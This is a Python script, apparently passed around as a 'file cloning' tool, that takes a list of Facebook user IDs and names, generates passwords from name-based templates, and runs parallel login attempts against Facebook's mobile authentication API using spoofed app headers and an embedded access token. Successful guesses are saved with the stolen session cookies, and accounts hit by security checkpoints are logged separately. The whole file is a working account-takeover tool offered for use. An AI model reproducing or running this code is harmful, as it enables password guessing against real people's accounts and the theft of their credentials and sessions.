# SCRIPT GIFT BY M0NST3R
# JOIN WHATSAPP GROUP : https://chat.whatsapp.com/FeUqeXZuiKu3CVaIP9dp0s
#-----------------------[ IMPORT ]-----------------------#
import os,requests,json,time,re,random,sys,uuid,string,subprocess,bs4
try:import pycurl,io
except:os.system('pip install pycurl')
try:
	os.system('clear')
	import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform,hashlib,zlib,re
	from string import * 
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\x1b[1;97m[\033[1;32m~\x1b[1;97m] INSTALLING MISSING MODULES...');os.system('pip install requests bs4 futures==2 > /dev/null')
except:pass
#-----------------------[ LOOP ]-----------------------#
loop=0;oks=[];cps=[];pcp=[];id=[];tokenku=[];plist=[]
#-----------------------[ COLOUR ]-----------------------#
G="\033[1;32m";W="\x1b[1;97m";R="\x1b[38;5;160m";B="\033[1;90m";Y="\033[1;33m";T="\033[1;34m";E="\x1b[38;5;205m";O="\x1b[38;5;81m"
#-----------------------[ STYLE ]-----------------------#
xd=f" {W}[{G}~{W}]{W}";xd1=f" {W}[{G}1{W}]{W}";xd2=f" {W}[{G}2{W}]{W}";xd0=f" {W}[{G}0{W}]{W}";xdx=f" {W}[{G}?{W}]{W}"
#-----------------------[ CLEAR ]-----------------------#
def clear():os.system('clear');print(logo)
def linex():print(f"{W}{47*'-'}")
#-----------------------[ USER AGENT ]-----------------------#
def _____monster_____():
	ua1 = '[FBAN/FB4A;FBAV/472.0.0.0.49;FBBV/453403994;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua2 = '[FBAN/FB4A;FBAV/383.0.0.23.106;FBBV/316614371;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua3 = '[FBAN/FB4A;FBAV/299.0.0.51.236;FBBV/261476335;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua4 = '[FBAN/FB4A;FBAV/309.0.0.45.119;FBBV/281818315;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua5 = '[FBAN/FB4A;FBAV/277.0.0.41.126;FBBV/227128646;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua6 = '[FBAN/FB4A;FBAV/182.0.0.44.77;FBBV/118379519;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	return random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
#-----------------------[ LOGO ]-----------------------#
logo = f'''\n         
d8888b. d888888b  d888b  d8888b.  .d8b.  
88  `8D   `88'   88' Y8b 88  `8D d8' `8b 
88oooY'    88    88      88oobY' 88ooo88 
88~~~b.    88    88  ooo 88`8b   88~~~88 
88   8D   .88.   88. ~8~ 88 `88. 88   88 
Y8888P' Y888888P  Y888P  88   YD YP   YP {G}0.3\n{W}{47*'-'}\n{xd} TOOL OWNER : M0MST3R-XD \n{xd} TOOL TYPE : FILE CLONING\n{W}{47*'-'}'''
#-----------------------[ MAIN MENU ]-----------------------#
def monster():
	os.system('xdg-open https://chat.whatsapp.com/FeUqeXZuiKu3CVaIP9dp0s')
	clear();print(f'{xd1} START FILE CLONING ');print(f'{xd0} EXIT FILE CLONING ');linex();mr=input(f'{xdx} SELECT : ')
	if mr in ["1"]:__________filex__________()
	elif mr in ["0"]:exit()
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);monster()
#-----------------------[ FILE MENU ]-----------------------#
def __________filex__________():
	os.system('xdg-open https://www.facebook.com/share/15VjfbLqLP/')
	clear();print(f'{xd} EXAMPLE : /sdcard/filename.txt ');linex();file = input(f'{xdx} ENTER FILE PATH : ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN ");time.sleep(1);__________filex__________()
	clear()
	try:
		ps_limit = int(input(f'{xdx} ENTER PASSWORD LIMIT : '))
	except:
		ps_limit = 5
	clear();print(f'{xd} EXAMPLE : firstlast | firtslast | first123');linex()
	for i in range(ps_limit):
		plist.append(input(f'{xd} ENTER PASSWORD {W}[{G}{i+1}{W}] : '))
	with tred(max_workers=30) as __________monster__________:
		clear();__________totaluid__________ = str(len(fo))
		print(f'{xd} TOTAL ACCOUNTS :{G} {__________totaluid__________} ')
		print(f'{xd} IF NO RESULT ON|OFF AIRPLANE MODE');linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			__________monster__________.submit(__________method__________,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK|CP :{G} '+str(len(oks))+'|'+str(len(cps)));linex();exit()
#-----------------------[ FILE METHOD ]-----------------------#
def __________method__________(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r\r{xd}~{W}[{G}M0NST3R-XD{W}]~[{Y}%s{W}]~[{G}%s{W}]~[{R}%s{W}] '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": _____monster_____(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://api.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r\r{xd}~{W}[{G}SUCCESSFUL{W}] '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r\r{xd}~{G}{cookies} ');linex()
                                        open('/sdcard/M0NST3R-XD-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        #print(f'\r{R}[{R}CHECKPOINT{R}]{R} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/M0NST3R-XD-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break       
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------------[ END ]-----------------------#
try:
	monster()
except requests.exceptions.ConnectionError:
	print('\x1b[1;97m[\033[1;32m~\x1b[1;97m] BROH YOUR NETWORK PROBLEM...')
	exit()
except:exit()